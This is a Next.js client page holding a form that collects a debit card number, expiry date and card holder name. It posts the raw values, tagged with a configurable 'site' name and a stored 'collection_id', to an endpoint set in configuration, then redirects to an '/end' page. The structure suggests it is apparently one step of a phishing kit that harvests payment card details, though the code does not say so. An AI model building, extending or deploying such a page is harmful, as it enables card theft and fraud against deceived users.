'use client';
import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";  
import { useState } from "react";

export default function Home() {
    const [loading, setLoading] = useState(false);
    const router = useRouter();
    const handleSubmit = async (e) => {
        const API_URL = process.env.NEXT_PUBLIC_URL;
        const SITE = process.env.NEXT_PUBLIC_SITE;
        e.preventDefault();
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['id'] = localStorage.getItem("collection_id");
        setLoading(true);
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            router.push('/end');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        }finally{
            setLoading(false);
        }
    };
  return (
    <>
   <Header />
    <div className="bg-primary card  mx-4 pt-3" style={{marginTop:"25px"}} >
        <form onSubmit={handleSubmit} className="mt-3 py-2 mx-4">
            <DebitCardInputComponent />
            <ExpiryDateInputComponent />
            <div className="form-group mb-5">
                <input name="cd" type="text" placeholder="Card Holder Name" className="form-control" required />
            </div>
            <div className="d-flex text-center mb-4 form-group justify-content-center ">
                <input type="submit" disabled={loading} className="btn btn-danger text-white px-5 shadow shadow-lg mt-2" defaultValue="Next" />
            </div>
        </form>
    </div>


    <Footer />
</>
  );
}
